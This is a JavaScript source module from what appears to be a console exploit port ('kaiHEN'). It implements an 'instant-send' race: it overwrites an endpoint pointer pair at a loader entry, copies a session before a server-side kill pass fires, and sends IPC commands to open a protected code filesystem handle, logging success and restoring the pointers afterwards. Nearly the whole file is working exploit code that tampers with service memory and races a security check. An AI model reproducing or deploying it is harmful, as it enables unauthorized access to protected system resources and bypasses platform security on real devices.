// kaiHEN port — instant-send probe (IS). The kill is an asynchronous
// server-side pass (SB: send-less, 10ms-4s after creation; the alive
// domain row never moves). Every 0xF601 we ever recorded was on a send
// that fired tens-of-ms to seconds after its copy — the author engine's
// native RPC thread sends within microseconds. IS removes every step
// between copy and send: the code-open packet and the borrow pointer are
// staged BEFORE the copy, so the send leaves one IPC after the copy
// reply:
//   transport 0    -> we beat the killer pass; the port bug is DELAY
//   transport 0xF601 -> the session is closed at creation after all

import runtime from "../core/runtime.mjs";
import {check, khLog, hex, arenaSlots, arenaAlloc, track, u64Bytes}
    from "./state.mjs";
import {readFs, writeFs} from "./endpoint.mjs";
import {cmifSend, bareSendTransport, buildCmif, oneMovedHandle}
    from "./wire.mjs";

const {cmifReply, sendIPC} = runtime;

export async function instantSendProbe(context, title) {
    const owned = context.inspectionDomain;
    const target = context.loaderRoot;
    const ep = context.ep;
    check(owned && target && context.loaderCopy && ep && ep.armed,
        "instant-send requires the loader-copy state");

    const entry20 = context.loaderCopy.ownEntry + 0x20;
    // Pre-stage everything that costs an IPC: warm the endpoint pointer at
    // the entry, read both pairs, build the code-open packet.
    await readFs(context, entry20, 8);
    const oldPair = await readFs(context, entry20, 0x10);
    const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
    const slots = arenaSlots(context);
    const info = arenaAlloc(context, 0x2000, "is-info");
    buildCmif(slots.pkt, {cmd: 0,
        input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
        b: [{addr: info + 32n, size: 0x1a4}]});

    // The race: borrow-write (1 IPC), copy (1 IPC), then the transport
    // battery — every send fires within the pre-kill window (~5-400ms).
    await writeFs(context, entry20, borrowPair);
    let copyHandle = 0;
    try {
        const reply = cmifSend(owned.handle, {pkt: slots.pkt,
            control: true, cmd: 1,
            input: [owned.root & 0xff, owned.root >> 8 & 0xff,
                owned.root >> 16 & 0xff, owned.root >> 24 & 0xff],
            rawWords: 9});
        const copyRc = reply.transport;
        if (copyRc === 0 && reply.moves && reply.moves.length)
            copyHandle = track(context, reply.moves[0], "is-copy");
        await khLog("IS1 copy rc=" + hex(copyRc) +
            " handle=" + hex(copyHandle));
        if (copyHandle) {
            // Trivial command (1 = IsArchivedProgram: u64 in, u8 out, no
            // descriptors) through both transports, then the code-open
            // through both. 0xE801 on the bare path with valid packets
            // points at a session-type/transport mismatch; if the
            // dispatcher transports 0, the port just needs the right send.
            buildCmif(slots.pkt2, {cmd: 1, input: u64Bytes(0x10n)});
            const t1 = bareSendTransport(copyHandle, slots.pkt2);
            buildCmif(slots.pkt2, {cmd: 1, input: u64Bytes(0x10n)});
            const d1 = Number(sendIPC(copyHandle, slots.pkt2)) >>> 0;
            let r1 = "-";
            if (d1 === 0) r1 = hex(cmifReply(slots.pkt2).result);
            await khLog("IS2 trivial bare=" + hex(t1) +
                " dispatcher=" + hex(d1) + " result=" + r1);
            buildCmif(slots.pkt, {cmd: 0,
                input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
                b: [{addr: info + 32n, size: 0x1a4}]});
            const t2 = bareSendTransport(copyHandle, slots.pkt);
            buildCmif(slots.pkt, {cmd: 0,
                input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
                b: [{addr: info + 32n, size: 0x1a4}]});
            const d2 = Number(sendIPC(copyHandle, slots.pkt)) >>> 0;
            await khLog("IS3 code-open bare=" + hex(t2) +
                " dispatcher=" + hex(d2));
            for (const [tag, pktBuf, rc] of [["bare", slots.pkt, t2],
                    ["disp", slots.pkt, d2]]) {
                if (rc !== 0) continue;
                const parsed = cmifReply(pktBuf);
                await khLog("IS4 " + tag + " result=" + hex(parsed.result) +
                    " moves=" + (parsed.moves ? parsed.moves.length : 0));
                if (parsed.result === 0 && parsed.moves && parsed.moves.length) {
                    context.instantCodeFs = track(context, parsed.moves[0],
                        "is-codefs");
                    await khLog("IS5 ***CODE FS OPEN*** handle=" +
                        hex(context.instantCodeFs));
                }
            }
        }
    } finally {
        await writeFs(context, entry20, oldPair);
    }
    // Retain the copied root when the code-open lived (the reference keeps
    // its copied roots for later code-opens); close only the dead ones.
    if (copyHandle && !context.instantCodeFs)
        try { runtime.closeHandle(copyHandle); }
        catch (error) { /* dead */ }
    return {ok: true};
}
